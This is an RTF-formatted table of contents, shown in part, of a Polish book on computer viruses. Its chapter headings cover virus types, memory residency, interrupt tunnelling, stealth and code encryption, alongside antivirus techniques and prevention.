{\rtf1\ansi\ansicpg1250\deff0
{\fonttbl
{\f0\fnil\fcharset0\fprq0\fttruetype Arial CE;}
{\f1\fnil\fcharset0\fprq0\fttruetype Arial;}
{\f2\fnil\fcharset0\fprq0\fttruetype Terminal;}
{\f3\fnil\fcharset0\fprq0\fttruetype Times New Roman;}
{\f4\fnil\fcharset0\fprq0\fttruetype Nimbus Sans L;}
{\f5\fnil\fcharset0\fprq0\fttruetype Dingbats;}
{\f6\fnil\fcharset0\fprq0\fttruetype Symbol;}
{\f7\fnil\fcharset0\fprq0\fttruetype Courier New;}}
{\colortbl
\red0\green0\blue0;
\red255\green255\blue255;}
{\stylesheet
{\s1\fi-431\li720\sbasedon29\snext29Contents 1;}
{\s2\fi-431\li1440\sbasedon29\snext29Contents 2;}
{\s3\fi-431\li2160\sbasedon29\snext29Contents 3;}
{\s8\fi-431\li720\sbasedon29Lower Roman List;}
{\s5\tx431\sbasedon25\snext29Numbered Heading 1;}
{\s6\tx431\sbasedon26\snext29Numbered Heading 2;}
{\s7\fi-431\li720Square List;}
{\*\cs11\sbasedon29Endnote Text;}
{\s4\fi-431\li2880\sbasedon29\snext29Contents 4;}
{\s9\fi-431\li720Diamond List;}
{\s10\fi-431\li720Numbered List;}
{\*\cs12\fs20\superEndnote Reference;}
{\s13\fi-431\li720Triangle List;}
{\*\cs14Default Paragraph Font;}
{\s15\tx431\sbasedon27\snext29Numbered Heading 3;}
{\s16\fi-431\li720Dashed List;}
{\s17\fi-431\li720\sbasedon10Upper Roman List;}
{\s18\sb440\sa60\f4\fs24\b\sbasedon29\snext29Heading 4;}
{\s19\fi-431\li720Heart List;}
{\s35\fi-431\li720Box List;}
{\s21\fi-431\li720\sbasedon10Upper Case List;}
{\s22\fi-431\li720Bullet List;}
{\s23\fi-431\li720Hand List;}
{\*\cs24\fs20\sbasedon29Footnote Text;}
{\s25\sb440\sa60\f4\fs34\b\sbasedon29\snext29Heading 1;}
{\s26\sb440\sa60\f4\fs28\b\sbasedon29\snext29Heading 2;}
{\s20\qc\sb240\sa120\f4\fs32\b\sbasedon29\snext29Contents Header;}
{\s28\fi-431\li720Tick List;}
{\s27\sb440\sa60\f4\fs24\b\sbasedon29\snext29Heading 3;}
{\s30\fi-431\li720\sbasedon10Lower Case List;}
{\s31\li1440\ri1440\sa120\sbasedon29Block Text;}
{\s37\f7\sbasedon29Plain Text;}
{\s33\tx1584\sbasedon5\snext29Section Heading;}
{\s34\fi-431\li720Implies List;}
{\s29\f3\fs20\lang1045Normal;}
{\s36\fi-431\li720Star List;}
{\*\cs32\fs20\superFootnote Reference;}
{\s38\tx1584\sbasedon5\snext29Chapter Heading;}}
\kerning0\cf0\ftnbj\fet2\ftnstart1\ftnnar\aftnnar\ftnstart1\aftnstart1\aenddoc\revprop3{\info\uc1{\author MD}}\deftab720\viewkind1\paperw12240\paperh15840\margl1440\margr1440\widowctl
\sectd\sbknone\colsx708\headery708\footery708\margtsxn1417\margbsxn1417\marglsxn1417\margrsxn1417\pgncont\ltrsect
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f1\fs40\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs40\b\lang1045{\*\listtag0}\abinodiroverride\ltrch SPIS ROZDZIA\uc1\u321\'a3\'d3W}{\f0\fs40\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs40\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Wst\uc1\u281\'ea}{\f1\fs28\lang1045{\*\listtag0}p ............................................ XV}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 1. Podstawowe wiadomo\uc1\u347\'9cci o wirusach ..............................1}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 2. Rodzaje wirus\'f3w ..............................................................5}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 3. Podzia\uc1\u322\'b3 wirus\'f3w ze wzgl\uc1\u281\'eadu na spos\'f3b dzia\uc1\u322\'b3ania po   uruchomieniu ..................................................................17}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 4. Obiekty atakowane przez wirusy ....................................33}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 5. Instalacja w pami\uc1\u281\'eaci operacyjnej ....................}{\f1\fs28\lang1045{\*\listtag0}................97}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 6. Przejmowanie przerwa\uc1\u324\'f1 i znajdowanie czystych wej\uc1\u347\'9c\uc1\u263\'e6 do    systemu ........................................................................109}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 7. Ukrywanie si\uc1\u281\'ea w systemie operacyjnym .......................143}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3}{\f1\fs28\lang1045{\*\listtag0} 8. Szyfrowanie kodu ..........................................................173}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 9. Inne mechanizmy stosowane przez wirusy ...................213}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 10. Przysz\uc1\u322\'b3o\uc1\u347\'9c\uc1\u263\'e6 wirus\'f3w .......................................................235}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3}{\f1\fs28\lang1045{\*\listtag0} 11. Rodzaje program\'f3w antywirusowych ............................241}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 12. Techniki u\uc1\u380\'bfywane przez programy antywirusowe .........247}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 13. Konwencje stosowane przez programy antywirusowe -standard CARO .......................................}{\f1\fs28\lang1045{\*\listtag0}.....................299}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 14. Profilaktyka antywirusowa ............................................311}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 15. Literatura .......................................................................319}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch SPIS TRE\uc1\u346\'8cCI}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wst\uc1\u281\'eap\tab XV}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 1. Podstawowe wiadomo\uc1\u347\'9cci o wirusach ..........\tab 1}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1.1. Co to jest i jak dzia\uc1\u322\'b3a wirus komputerowy ...............................\tab 3}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 1.2. J\uc1\u281\'eazyki programowania wykorzystane do pisania wirus\'f3w ......\tab 4}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 2. Rodzaje wirus\'f3w ..............................}{\f1\fs24\b\lang1045{\*\listtag0}............\tab 5}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.1. Wirusy paso\uc1\u380\'bfytnicze (ang. parasite infectors) .......................\tab 7}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.2. Wirusy towarzysz\uc1\u261\'b9ce (ang. companion infectors) .................\tab 8}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.3. Wirusy plik\'f3w wsadowych (ang. batchviruses).......................\tab 12}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.4. Makrowirusy, wirusy makros\'f3w (ang. macroviruses) ..............\tab 13}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.5. Generatory wirus\'f3w ................................................................\tab 14}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.6. Robaki (ang. worms) ..............................................................\tab 14}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.7. Konie troja\uc1\u324\'f1s}{\f1\fs24\lang1045{\*\listtag0}kie (ang. trojan horses) ......................................\tab 14}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 2.8. Bomby logiczne (ang. logical bombs)......................................\tab 15}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 3. Podzia\uc1\u322\'b3 wirus\'f3w ze wzgl\uc1\u281\'eadu na spos\'f3b dzia\uc1\u322\'b3ania}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch po uruchomieniu ............................................................\tab 17}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 3.1. Wirusy nierezydentne (ang. non-resident yiruses) ...............\tab 19}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 3.2. Wirusy rezydentme (ang. resident viruses) ..........................\tab 21}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 3.2.1. Szybkie infektory (ang. fast infectors) ..................................\tab 31}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 3.2.2. Wolne infektory (ang. slow infectors) ...................................\tab 32}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 4. Obiekty atakowane przez wirusy ..................\tab 33}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1. Pliki...................................................................................35}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.1. Pliki wykonywalne COM .............................\tab 35}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.2. Pliki wykonywalne EXE ............................... 45}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.2.1. Pliki EXE dla systemu DOS (stare EXE) ..................... 45}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.2.2. Pliki EXE dla trybu chronionego (nowe EXE) ..................   57}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.2.2.1. Pliki EXE dla Windows (NE) .............................\tab 59}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.3. Pliki zawieraj\uc1\u261\'b9ce sterowniki urz\uc1\u261\'b9dze\uc1\u324\'f1 SYS (BIN, DRV) ....\tab 66}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.4. Pliki systemowe DOS ...............................\tab 75}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.4.1. Interpretator polece\uc1\u324\'f1 ......}{\f1\fs24\lang1045{\*\listtag0}..............................\tab 75}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.4.2. J\uc1\u261\'b9dro systemu (ang, kemel infector) ........................\tab 75}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.5. Pliki wsadowe BAT .................................\tab 76}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.6. Pliki DOC .........................................\tab 77}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.7. Pliki XLS..........................................\tab 79}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.1.8. Pliki ASM .........................................\tab 80}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.2. Sektory systemowe ..................................\tab 86}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.2.1. G\uc1\u322\'b3\'f3wny Rekord \uc1\u321\'a3aduj\uc1\u261\'b9cy (ang. Master Boot Record - MBR)\tab 86}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.3. R}{\f0\fs24\lang1045{\*\listtag0}ekord \uc1\u322\'b3aduj\uc1\u261\'b9cy (ang. BOOt-sector).....................\tab 92}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.4. Jednostki Alokacji Plik\'f3w (JAP) (ang. dusters) ............\tab 94}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 4.5. Wirusy kombinowane (ang. multipartition) ................\tab 96}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 5. Instalacja w pami\uc1\u281\'eaci operacyjnej .............\tab 97}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.}{\f0\fs24\lang1045{\*\listtag0}1. Instalacja w tablicy wektor\'f3w przerwa\uc1\u324\'f1 ..................\tab 99}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.2. Instalacja w obszarze zmiennych DOS ..................\tab 100}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.3. Instalacja w pami\uc1\u281\'eaci poni\uc1\u380\'bfej 640kB i UMB ...............\tab 100}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.4. Instalacja w pami\uc1\u281\'eaci HMA .............................\tab 10}{\f1\fs24\lang1045{\*\listtag0}6}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.5. Nietypowe metody instalacji ...........................\tab 107}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.5.1. Pami\uc1\u281\'ea\uc1\u263\'e6 ekranu ....................................\tab 107}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.5.2. Bufory dyskowe DOS ...............................\tab 108}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 6. Przejmowanie przerwa\uc1\u324\'f1 i znajdowanie czystych}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch wej\uc1\u347\'9c\uc1\u263\'e6 do}{\f1\fs24\b\lang1045{\*\listtag0} systemu ...................................\tab 109}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.1. Najcz\uc1\u281\'ea\uc1\u347\'9cciej przejmowane i wykorzystywane przerwania .....\tab 111}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.2. Wykorzystanie funkcji DOS ............................\tab 117}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.3. Bezpo\uc1\u347\'9crednie zmiany w tablicy wektor\'f3w przerwa\uc1\u324\'f1 ,.,,,.,\tab 118}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.4. W\uc1\u322\'b3\uc1\u261\'b9czanie si\uc1\u281\'ea do istniej\uc1\u261\'b9cego \uc1\u322\'b3a\uc1\u324\'f1cucha obs\uc1\u322\'b3ugi przerwania}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch i znajdowanie czystych wej\uc1\u347\'9c\uc1\u263\'e6 do systemu (ang. tunnelling) ....   119}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.4.1. Korzystanie ze sta\uc1\u322\'b3ych adres\'f3w w systemie (przerwania}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 21hl2Fh) ............................................   120}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.4.2. Wykorzystanie trybu krokowego procesora (ang. tracing)...       122}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.4.3. Tuneling rekursywny (ang, recursive tunnelling)...........       122}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.4.4. Trik 2F/13 ........................................      124}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.5. Wykorzystanie trybu chronionego .......................      141}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.6. W\uc1\u322\'b3\uc1\u261\'b9czanie si\uc1\u281\'ea jako program obs\uc1\u322\'b3ugi urz\uc1\u261\'b9dzenia ...........      142}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 7. Ukrywanie si\uc1\u281\'ea w systemie operacyjnym ........    143}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1. Technika stealth .....................................      145}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.1. Podawanie prawdziwych d\uc1\u322\'b3ugo\uc1\u347\'9cci plik\'f3w (ang, semi-stealth)       146}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.1.1. Polecenie DIR wywo\uc1\u322\'b3ywane z poziomu DOS .................   146}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.1.2. Programy nak\uc1\u322\'b3adkowe u\uc1\u380\'bfywaj\uc1\u261\'b9ce kr\'f3tkich nazw program\'f3w}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (DOS, Windows 3.1)......................................  149}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.1.3. Programy wykorzystuj\uc1\u261\'b9ce d\uc1\u322\'b3ugie nazwy plik\'f3w (Windows95)}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch oraz polecenie DIR wywo\uc1\u322\'b3ywane z poziomu okna Tryb MS-DOS .   150}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.2. Podawanie oryginalnych d\uc1\u322\'b3ugo\uc1\u347\'9cci i zawarto\uc1\u347\'9cci plik\'f3w}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch (ang.full stealth).......................................   152}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.3. Podawanie prawdziwej zawarto\uc1\u347\'9cci sektor\'f3w (ang. Sectorlevel stealth) ..............................................   169}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.4. Fa\uc1\u322\'b3szowanie odczytywanych sektor\'f3w na etapie obs\uc1\u322\'b3ugi przerwa\uc1\u324\'f1 sprz\uc1\u281\'eatowych (ang. hardware}{\f1\fs24\lang1045{\*\listtag0} level stealth) ...............   169}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.2. Modyfikacja CMOS-a .................................      170}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.3. Atrybut etykiet dysku (ang. VolumeID) ..................      171}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.4. Dodatkowe \uc1\u347\'9ccie\uc1\u380\'bfki na dyskach .........................      171}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Rozdzia\uc1\u322\'b3 8.}{\f1\fs24\b\lang1045{\*\listtag0} Szyfrowanie kodu .........................    173}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 8.1. Procedury szyfruj\uc1\u261\'b9ce kod .............................      177}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 8.2. Procedury dekoduj\uc1\u261\'b9ce ................................      178}{\f0\fs24\lang1045{\*\listtag0}\par}
